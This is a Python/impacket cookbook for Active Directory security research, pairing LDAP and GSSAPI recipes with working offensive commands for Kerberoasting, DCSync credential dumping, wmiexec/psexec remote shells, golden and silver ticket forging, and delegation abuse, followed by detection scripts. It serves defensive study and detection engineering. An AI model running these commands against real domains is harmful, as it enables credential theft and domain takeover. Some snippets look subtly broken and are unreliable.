---
title: Python / impacket AD Security & Research Cookbook
audience: senior-engineers
tags: [python, impacket, ldap3, gssapi, pyasn1, security, kerberoasting, dcsync]
related:
  - ../02-protocols/01-kerberos-internals.md
  - ../02-protocols/02-ldap-protocol.md
  - ../02-protocols/03-smb-cifs-protocol.md
  - ../02-protocols/04-ntlm-internals.md
  - ../02-protocols/06-rpc-dcerpc-ms-drsr.md
  - ../02-protocols/08-spn-upn-pac.md
  - ../03-directory-schema/05-replication-internals.md
  - ./01-powershell-ad-cmdlets.md
  - ./04-wireshark-tshark-filters.md
  - ../12-references/03-source-code-references.md
last_updated: 2026-08-13
---

# Python / impacket AD Security & Research Cookbook

Reference recipes using `ldap3`, `impacket`, `gssapi`, `pyspnego`, `pywin32`, and `pyasn1` for AD automation and security research. Each example: **code → explanation → expected output → security considerations**.

> ⚠ Use only on systems you own or are explicitly authorized to test. Several recipes mirror offensive tradecraft (Kerberoasting, DCSync, ticket forging) — included for defensive understanding and detection engineering.

## Setup

```bash
pip install ldap3 impacket gssapi pyspnego pyasn1 pyasn1-modules
# Optional for Windows-side recipes:
pip install pywin32
```

For `gssapi` on Linux, also need system libs:

```bash
apt install libkrb5-dev libgssapi-krb5-2   # Debian/Ubuntu
dnf install krb5-devel gssproxy            # RHEL/Fedora
```

## `ldap3` recipes

### Bind with GSSAPI (SASL)

```python
import ldap3
from ldap3.protocol.sasl import sasl_gssapi

server = ldap3.Server('dc01.corp.example.com', port=389, use_ssl=False,
                      get_info=ldap3.ALL)
conn = ldap3.Connection(server, authentication=ldap3.SASL,
                        sasl_mechanism='GSSAPI', sasl_credentials=(None, None, None))

if not conn.bind():
    print('Bind failed:', conn.result)
else:
    print('Bound as:', conn.extend.standard.who_am_i())
    # Expected: u:CORP\jsmith
```

Security: GSSAPI bind uses the user's existing TGT from the CCACHE (`KRB5CCNAME` env var). No password in the script. Requires `kinit jsmith@CORP.EXAMPLE.COM` first.

### Search for users with `badPwdCount > 0`

```python
conn.search(
    search_base='DC=corp,DC=example,DC=com',
    search_filter='(&(objectClass=user)(badPwdCount>=1))',
    search_scope='SUBTREE',
    attributes=['sAMAccountName', 'badPwdCount', 'badPasswordTime', 'lockoutTime']
)

for entry in conn.entries:
    print(entry.sAMAccountName, entry.badPwdCount.value,
          entry.badPasswordTime.value, entry.lockoutTime.value)
```

Expected output:
```
jsmith 3 133961634990000000 0
adavis 5 133961635000000000 133961640000000000
```

> `badPwdCount` is not replicated — query each DC and aggregate to find true count.

### Query SPN registrations (Kerberoasting target enumeration)

```python
conn.search(
    search_base='DC=corp,DC=example,DC=com',
    search_filter='(&(objectClass=user)(servicePrincipalName=*))',
    search_scope='SUBTREE',
    attributes=['sAMAccountName', 'servicePrincipalName',
                'userAccountControl', 'memberOf']
)

for entry in conn.entries:
    uac = entry.userAccountControl.value
    is_dc = bool(uac & 0x2000)  # SERVER_TRUST_ACCOUNT
    is_svc = bool(uac & 0x20000)  # DONT_EXPIRE_PASSWORD
    print(f"{entry.sAMAccountName.value:30} UAC=0x{uac:x} SPNs={entry.servicePrincipalName.values}")
```

### Modify `userAccountControl` (disable account)

```python
from ldap3 import MODIFY_REPLACE

target_dn = 'CN=jsmith,OU=Users,DC=corp,DC=example,DC=com'
conn.search(search_base=target_dn, search_scope='BASE',
            search_filter='(objectClass=*)', attributes=['userAccountControl'])
uac = int(conn.entries[0].userAccountControl.value)

# Set ACCOUNTDISABLE bit (0x2)
new_uac = uac | 0x2
conn.modify(target_dn, {'userAccountControl': [(MODIFY_REPLACE, [str(new_uac)])]})
print('Result:', conn.result['description'])  # success
```

### Change user password (needs TLS)

```python
import ldap3

# Active Directory requires 128-bit TLS or SASL for password changes.
server = ldap3.Server('ldaps://dc01.corp.example.com:636',
                      use_ssl=True, get_info=ldap3.ALL)
conn = ldap3.Connection(server, authentication=ldap3.SASL,
                        sasl_mechanism='GSSAPI')

if conn.bind():
    target_dn = 'CN=jsmith,OU=Users,DC=corp,DC=example,DC=com'
    new_pw = 'N3wP@ss!2026'
    # AD expects unicodePwd in UTF-16LE surrounded by double quotes (RFC 2251 BER).
    encoded_pw = f'"{new_pw}"'.encode('utf-16-le')
    conn.modify(target_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, [encoded_pw])]})
    print('Result:', conn.result['description'])
```

Security: Never send `unicodePwd` over plaintext LDAP. TLS (LDAPS or StartTLS) is mandatory.

## `impacket` recipes

### GetUserSPNs.py — Kerberoasting

```bash
GetUserSPNs.py corp.example.com/jsmith:'P@ss!' -dc-ip dc01.corp.example.com \
  -request -outputfile hashes.txt
```

Or programmatically:

```python
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ldap import ldap, ldapasn1

# 1. Get TGT
userName = Principal('jsmith', type=PrincipalNameType.NT_PRINCIPAL)
tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
    userName, 'CORP.EXAMPLE.COM', 'P@ss!',
    kdcHost='dc01.corp.example.com'
)

# 2. LDAP search for SPN-bearing users
ldap_conn = ldap.LDAPConnection('ldap://dc01.corp.example.com')
ldap_conn.login('jsmith', 'P@ss!', 'CORP.EXAMPLE.COM')
search = ldap_conn.search(
    searchFilter='(servicePrincipalName=*)',
    attributes=['servicePrincipalName', 'sAMAccountName']
)

# 3. For each SPN, request a TGS (service ticket) — the ticket's
#    encryption key is derived from the service account's password hash.
for entry in search:
    spn = entry['attributes']['servicePrincipalName'][0]
    sname = Principal(spn, type=PrincipalNameType.NT_PRINCIPAL)
    tgs = getKerberosTGS(sname, 'CORP.EXAMPLE.COM', tgt, sessionKey, kdcHost='dc01')
    # tgs['ticket'] is the encrypted Ticket — extract and crack offline.
    print(f"Got TGS for {spn} ({len(tgs['ticket'])} bytes)")
```

Security: Kerberoasting is offline-crackable because the service ticket is encrypted with the service account's RC4-HMAC or AES key — both derivable from the password. Defense: disable RC4, enforce long random passwords for service accounts, use gMSAs.

### secretsdump.py — DCSync via MS-DRSR

```bash
secretsdump.py -just-dc corp.example.com/jsmith:'P@ss!'@dc01.corp.example.com
```

Programmatic equivalent (excerpt):

```python
from impacket.dcerpc.v5 import transport, drsuapi
from impacket.spnego import SPNEGO_NegTokenInit

# 1. DRSBind with DRSUAPI interface UUID E3514235-...
rpc_transport = transport.DCERPCTransportFactory(
    f'ncacn_ip_tcp:dc01.corp.example.com'
)
rpc_transport.set_credentials('jsmith', 'P@ss!', 'CORP.EXAMPLE.COM')
rpc_transport.set_kerberos(True, kdcHost='dc01.corp.example.com')

dce = rpc_transport.get_dce_rpc()
dce.connect()
dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

# 2. DRSBind — exchange DRS_EXTENSIONS, get RPC handle
request = drsuapi.DRSBind()
request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
request['pextClient']['cb'] = 0  # let server fill
resp = dce.request(request)
hDrs = resp['phDrs']

# 3. DRSCrackNames — resolve DOMAIN\DC$ → DN
request = drsuapi.DRSCrackNames()
request['hDrs'] = hDrs
request['dwInVersion'] = 1
request['pmsgIn']['V1']['cNames'] = 1
request['pmsgIn']['V1']['rpNames'][0]['enFormat'] = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
request['pmsgIn']['V1']['rpNames'][0]['String'] = 'CORP\\dc01$'

# 4. DRSGetNCChanges with EXOP_REPL_SECRETS (opnum 3, ulFlagsWithExtras 0x21000000)
# Returns populated linktable including unicodePwd, ntPwdHistory, supplementalCredentials
# (PKDUMP_ATTR_SUPPLEMENTAL_CREDENTIALS — cleartext cached for AES key derivation).
```

Security: DCSync requires `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) AND `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) extended rights. Only Domain Admins, Enterprise Admins, and DCs have these by default. Defense: alert on any non-DC account calling `DRSGetNCChanges` with `EXOP_REPL_SECRETS`.

### wmiexec.py — semi-interactive shell via DCOM WMI

```bash
wmiexec.py corp.example.com/jsmith:'P@ss!'@host01.corp.example.com
```

Internally:
1. SMB2 tree connect to `\\host01\IPC$`
2. DCE/RPC bind to `ISystemActivator` (DCOM activation)
3. Spawn `WmiWin32_Process.Create("cmd.exe /Q /c <command> > C:\\__output 2>&1")`
4. Retrieve `C:\__output` via SMB
5. Delete `C:\__output` via SMB

Defense: Event 4688 (process create) with parent `WmiPrvSE.exe`; Sysmon Event 1 (process create); Event 4648 (explicit logon).

### psexec.py — SMB-based shell (uses `RemComSvc`)

```bash
psexec.py corp.example.com/jsmith:'P@ss!'@host01.corp.example.com
```

Mechanics:
1. SMB2 tree connect to `ADMIN$`
2. Upload `RemComSvc.exe` (custom service binary)
3. SCM `CreateServiceW` → `StartService`
4. SMB2 named pipe `\\host01\IPC$\RemCom_communicaton`
5. Execute commands via stdin/stdout over the pipe

Defense: Event 7045 (service install) — service binary in `ADMIN$` is a red flag. Sysmon Event 13 (registry value set) on `HKLM\SYSTEM\CurrentControlSet\Services\RemCom...`.

### smbclient.py — interactive SMB shell

```bash
smbclient.py corp.example.com/jssmith:'P@ss!'@file01.corp.example.com
```

Programmatic:

```python
from impacket.smbconnection import SMBConnection

conn = SMBConnection('file01.corp.example.com', 'file01.corp.example.com', sess_port=445)
conn.kerberosLogin('jsmith', 'P@ss!', 'CORP.EXAMPLE.COM',
                   kdcHost='dc01.corp.example.com')

# List shares
for share in conn.listShares():
    print(share['shi1_netname'][:-1])

# Walk SYSVOL
conn.connectTree('SYSVOL')
for entry in conn.listPath('SYSVOL', '\\corp.example.com\\Policies\\*'):
    print(entry.get_longname(), entry.get_filesize())
```

### ticketer.py — forge Kerberos tickets

```bash
# Golden ticket (forged TGT using krbtgt account hash)
ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-... -domain CORP.EXAMPLE.COM \
  -user-id 500 Administrator

# Silver ticket (forged service ticket using service account hash)
ticketer.py -nthash <svc_sql_ntlm_hash> -domain-sid S-1-5-21-... -domain CORP.EXAMPLE.COM \
  -user-id 500 -spn MSSQLSvc/sql01.corp.example.com:1433 Administrator
```

Mechanics: forge the `Ticket` structure directly from ASN.1, encrypt with the target's long-term key (krbtgt for golden, service account for silver). No KDC interaction → no detection on DC. Use with `KRB5CCNAME` env var + impacket tools.

Defense: PAC validation (Server 2012+ if `krbtgt` rotates); AES-only mode (golden ticket forged with RC4 detected on KDC event 4769); alert on tickets whose lifetime exceeds policy max.

### getST.py — S4U2Self + S4U2Proxy (constrained delegation abuse)

```bash
getST.py -spn cifs/file01.corp.example.com -impersonate Administrator \
  corp.example.com/svc-web:'P@ss!'
```

Mechanics:
1. **S4U2Self** (PA-FOR-USER): service requests a TGS for itself on behalf of user `Administrator`. Returns forwardable TGS if `TRUSTED_TO_AUTH_FOR_DELEGATION` set on service account.
2. **S4U2Proxy**: service presents that TGS to KDC, gets a usable TGS for `cifs/file01` as `Administrator`. KDC checks `msDS-AllowedToDelegateTo` on the service account.

Defense: prefer resource-based constrained delegation (`msDS-AllowedToActOnBehalfOfOtherIdentity`) — KDC checks the target's attribute, not the source's. Disable unconstrained / traditional constrained delegation where possible.

## `pywin32` recipes

### `LogonUser` — interactive logon

```python
import win32security
import win32con

token = win32security.LogonUser(
    'jsmith',                 # username
    'CORP',                   # domain
    'P@ss!',                  # password
    win32con.LOGON32_LOGON_INTERACTIVE,
    win32con.LOGON32_PROVIDER_DEFAULT
)
print('Logon OK, token handle:', token)
token.Detach()
```

### `NetUserGetInfo`

```python
import win32net
import win32netcon

# level 4 = full info (password hash not exposed at this level)
info = win32net.NetUserGetInfo('\\\\dc01', 'jsmith', 4)
print('FullName:', info['full_name'])
print('PasswordExpired:', info['password_expired'])
print('LastLogon:', info['last_logon'])
print('PrimaryGroupID:', info['primary_group_id'])
```

### `LoadUserProfile`

```python
import win32profile
import win32security

token = win32security.LogonUser('jsmith', 'CORP', 'P@ss!',
                                win32con.LOGON32_LOGON_INTERACTIVE,
                                win32con.LOGON32_PROVIDER_DEFAULT)
profile_path = r'\\dc01\Profiles\jsmith'
env = {}
profile = win32profile.LoadUserProfile(token, {'UserName': 'jsmith',
                                                'ProfilePath': profile_path})
print('Profile registry hive key:', profile)
win32profile.UnloadUserProfile(token, profile)
```

## `gssapi` recipes

### Client-side: get MIC over a buffer

```python
import gssapi

name = gssapi.Name('cifs/file01.corp.example.com@CORP.EXAMPLE.COM',
                   name_type=gssapi.NameType.user)
ctx = gssapi.SecurityContext(name=name, usage='initiate',
                             flags=[gssapi.RequirementFlag.mutual_authentication,
                                    gssapi.RequirementFlag.out_of_sequence_detection])

# Initiate: produce first token to send to acceptor
init_token = ctx.step(b'')
print('Init token (first AP-REQ):', init_token.hex())

# Once acceptor responds, complete the handshake:
# ctx.step(response_token)
# After completion:
message = b'Hello, world'
mic_token = ctx.get_mic(message)
print('MIC:', mic_token.hex())

# Verify on the other side:
# acceptor_ctx.verify_mic(message, mic_token)
```

### Server-side: accept GSS context

```python
import gssapi

server_name = gssapi.Name('cifs/file01.corp.example.com@CORP.EXAMPLE.COM',
                          name_type=gssapi.NameType.hostbased_service)
server_cred = gssapi.Credentials(usage='accept', name=server_name)
ctx = gssapi.SecurityContext(name=None, creds=server_cred, usage='accept')

# Receive the client's first token:
input_token = b'\x60\x82...'  # AP-REQ from client
output_token = ctx.step(input_token)
if ctx.complete:
    print('Client authenticated:', ctx.initiator_name)
    print('Session key type:', ctx.mech)  # krb5 OID
```

## `pyspnego` recipes

### Client — negotiate Kerberos vs NTLM

```python
import spnego
import socket

s = socket.create_connection(('file01.corp.example.com', 445))

# Initialize SPNEGO client — by default tries Kerberos first, NTLM as fallback.
client = spnego.client(
    username='jsmith', password='P@ss!', domain='CORP',
    hostname='file01.corp.example.com',
    service='cifs'
)

# Step 1: produce NEGOTIATE_TOKEN (Type 1 for NTLM, AP-REQ for Kerberos wrapped in SPNEGO)
in_token = b''
while not client.complete:
    out_token = client.step(in_token)
    if out_token:
        s.send(spnego_wrap(out_token))
    in_token = spnego_read_response(s)

print('Negotiated mech:', client.negotiated_protocol)  # 'kerberos' or 'ntlm'
```

### Server — accept SPNEGO

```python
import spnego

server = spnego.server(
    hostname='file01.corp.example.com', service='cifs'
)

# Receive first token from client:
in_token = b'\x60...'  # SPNEGO NegTokenInit
out_token = server.step(in_token)
if server.complete:
    print('Authenticated user:', server.negotiated_protocol,
          server.username if hasattr(server, 'username') else '?')
```

## Custom Kerberos AS-REQ crafting (pure Python + pyasn1)

```python
from pyasn1.type import univ, tag, namedtype, char
from pyasn1.codec.der import encoder
from pyasn1_modules import rfc5280

# Kerberos ASN.1 (simplified — RFC 4120 §5.4.1)
class Int32(univ.Integer): pass

class PrincipalName(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('name-type', Int32().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
        namedtype.NamedType('name-string', univ.SequenceOf(componentType=char.GeneralString()).subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))
    )

class KDCReqBody(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('kdc-options', univ.BitString().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),
        namedtype.NamedType('cname', PrincipalName().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1))),
        namedtype.NamedType('realm', char.GeneralString().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 2))),
        namedtype.NamedType('sname', PrincipalName().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 3))),
        namedtype.NamedType('till', univ.GeneralizedTime().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 5))),
        namedtype.NamedType('nonce', Int32().subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 7))),
        namedtype.NamedType('etype', univ.SequenceOf(componentType=Int32()).subtype(
            explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 8)))
    )

# Build the body
body = KDCReqBody()
body['kdc-options'] = "'0100000000000000'B"  # forwardable
body['cname']['name-type'] = 1  # NT_PRINCIPAL
body['cname']['name-string'][0] = 'jsmith'
body['realm'] = 'CORP.EXAMPLE.COM'
body['sname']['name-type'] = 2  # NT_SRV_INST
body['sname']['name-string'][0] = 'krbtgt'
body['sname']['name-string'][1] = 'CORP.EXAMPLE.COM'
body['till'] = '19700101000000Z'  # "never expire" sentinel
body['nonce'] = 1234567890
body['etype'][0] = 18  # AES-256
body['etype'][1] = 17  # AES-128
body['etype'][2] = 23  # RC4 (for legacy)

encoded_body = encoder.encode(body)
print('AS-REQ body (DER, hex):', encoded_body.hex())
```

This is research-grade — for real-world use, `impacket.krb5.kerberosv5.getKerberosTGT` is preferable. Useful for fuzzing KDCs or testing non-standard etype combinations.

## `pyasn1` decode TGS-REP

```python
from pyasn1.codec.der import decoder
from pyasn1_modules import rfc4120

# raw_tgs_rep is bytes from a TGS-REP packet (captured via tshark -T fields -e kerberos)
raw_tgs_rep = b'\x6d\x82\x04\x...'

tgs_rep, remainder = decoder.decode(raw_tgs_rep, asn1Spec=rfc4120.TGSREP())

print('PVNO:', tgs_rep['pvno'])  # 5
print('msg-type:', tgs_rep['msg-type'])  # 13
print('crealm:', tgs_rep['crealm'])
print('cname:', tgs_rep['cname']['name-string'][0])
print('ticket realm:', tgs_rep['ticket']['realm'])
print('ticket sname:', '/'.join(str(x) for x in tgs_rep['ticket']['sname']['name-string']))
print('enc-part etype:', tgs_rep['enc-part']['etype'])  # 18 = AES-256
print('enc-part cipher len:', len(tgs_rep['enc-part']['cipher']))
```

Expected output:
```
PVNO: 5
msg-type: 13
crealm: CORP.EXAMPLE.COM
cname: jsmith
ticket realm: CORP.EXAMPLE.COM
ticket sname: cifs/file01.corp.example.com
enc-part etype: 18
enc-part cipher len: 312
```

## Kerberos PAC decode (impacket)

```python
from impacket.krb5 import constants
from impacket.krb5.pac import PAC, PACInfoBuffer
from impacket.krb5.types import KerberosError
import struct

# Extracted from a captured service ticket (the inner Ticket.enc-part, decrypted).
# For a research example, we use a known structure.
pac_data = b'...'  # raw PAC buffer starting with PACTYPE header

# PACTYPE header: 4 bytes cBuffers, 4 bytes Version, then PAC_INFO_BUFFER[]
c_buffers, version = struct.unpack('<II', pac_data[:8])
print(f'PAC version: {version}, buffer count: {c_buffers}')

offset = 8
for i in range(c_buffers):
    ul_type, cb_size, ptr_offset = struct.unpack('<IIQ', pac_data[offset:offset+16])
    buf_data = pac_data[ptr_offset:ptr_offset+cb_size]
    print(f'  Buffer {i}: type=0x{ul_type:x} size={cb_size}')

    if ul_type == 0x01:  # PAC_LOGON_INFO
        # KERB_VALIDATION_INFO — has LogonTime, LogoffTime, KickOffTime,
        # PasswordLastSet, PasswordCanChange, PasswordMustChange, EffectiveName,
        # FullName, LogonDomainName, UserSID, GroupCount, Groups, ...
        from impacket.krb5.pac import KERB_VALIDATION_INFO
        kvi = KERB_VALIDATION_INFO()
        kvi.fromString(buf_data)
        print(f'    UserName: {kvi["EffectiveName"]}')
        print(f'    LogonDomain: {kvi["LogonDomainName"]}')
        print(f'    UserSID: {kvi["UserSid"].formatCanonical()}')
        print(f'    LogonTime: {kvi["LogonTime"]}')
    elif ul_type == 0x06:  # PAC_SIGNATURE_DATA (svc checksum)
        sig_type, sig = struct.unpack('<I', buf_data[:4])[0], buf_data[4:]
        print(f'    SignatureType: 0x{sig_type:x}  ({len(sig)} bytes)')
    elif ul_type == 0x07:  # PAC_SIGNATURE_DATA (KDC checksum)
        sig_type, sig = struct.unpack('<I', buf_data[:4])[0], buf_data[4:]
        print(f'    SignatureType: 0x{sig_type:x}  ({len(sig)} bytes)')
    elif ul_type == 0x0A:  # PAC_UPN_DNS_INFO
        from impacket.krb5.pac import PAC_UPN_DNS_INFO
        upn = PAC_UPN_DNS_INFO()
        upn.fromString(buf_data)
        print(f'    UPN: {upn["Upn"]}, DNS: {upn["DnsDomainName"]}')
    elif ul_type == 0x0E:  # PAC_BUFFER_TICKET_CHECKSUM (Server 2016+)
        print('    PAC_BUFFER_TICKET_CHECKSUM (defense against silver ticket)')
    elif ul_type == 0x13:  # PAC_FULL_CHECKSUM
        print('    PAC_FULL_CHECKSUM (Server 2016+)')

    offset += 16
```

## Detection / defensive recipes

### Detect DCSync via Windows Event Log

```python
# Search for MS-DRSR DRSGetNCChanges from a non-DC account.
# Best signal: Event 4662 (operation performed on object) with
# Properties containing 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
# (DS-Replication-Get-Changes-All)
import xml.etree.ElementTree as ET
import win32evtlog

server = 'localhost'
hand = win32evtlog.OpenEventLog(server, 'Security')
flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

while True:
    events = win32evtlog.ReadEventLog(hand, flags, 0)
    if not events:
        break
    for e in events:
        if e.EventID != 4662:
            continue
        # Parse the event XML for Properties containing DS-Replication-Get-Changes-All
        s = ['<event>']
        s.append(f'<time>{e.TimeGenerated}</time>')
        s.append(f'<sid>{e.Sid}</sid>')
        s.append(f'<string>{e.StringInserts}</string>')
        s.append('</event>')
        if '1131f6ad' in str(e.StringInserts):
            print('Potential DCSync:', e.TimeGenerated, e.Sid)
```

### Detect Kerberoasting via 4769

```python
# Event 4769 = Kerberos service ticket request.
# Kerberoasting signal: ticket encryption type 0x17 (RC4-HMAC) requested by
# a user, with a service ticket for an SPN-bearing account.
import re
from datetime import datetime

with open('security.evtx') as f:
    for line in f:
        if 'EventID>4769<' in line:
            # Extract fields
            acct = re.search(r'Account Name:\s+(.+?)\s', line)
            spn = re.search(r'Service Name:\s+(.+?)\s', line)
            etype = re.search(r'Ticket Encryption Type:\s+0x([0-9a-f]+)', line)
            if etype and etype.group(1) == '17':
                print(f'{datetime.now()}: RC4 Kerberoast by {acct.group(1)} on {spn.group(1)}')
```

### Detect Silver Ticket via PAC validation missing

```python
# Silver tickets are forged directly with the service account hash — no KDC interaction.
# Detection: enable PAC validation on service (Server 2012+ with KB and configured
# via KdcPolicies). Event 4769 with no prior 4768 (TGT request) for the same user
# may indicate a forged ticket.
```

## See also

- [../02-protocols/01-kerberos-internals.md](../02-protocols/01-kerberos-internals.md) — Kerberos ASN.1 reference.
- [../02-protocols/06-rpc-dcerpc-ms-drsr.md](../02-protocols/06-rpc-dcerpc-ms-drsr.md) — DRSUAPI opnums and NDR structures.
- [../02-protocols/08-spn-upn-pac.md](../02-protocols/08-spn-upn-pac.md) — PAC buffer types.
- [../03-directory-schema/05-replication-internals.md](../03-directory-schema/05-replication-internals.md) — Replication mechanics.
- [./01-powershell-ad-cmdlets.md](./01-powershell-ad-cmdlets.md) — PowerShell ops counterpart.
- [./04-wireshark-tshark-filters.md](./04-wireshark-tshark-filters.md) — Wire-level diagnostics.
- [../12-references/03-source-code-references.md](../12-references/03-source-code-references.md) — impacket source paths.
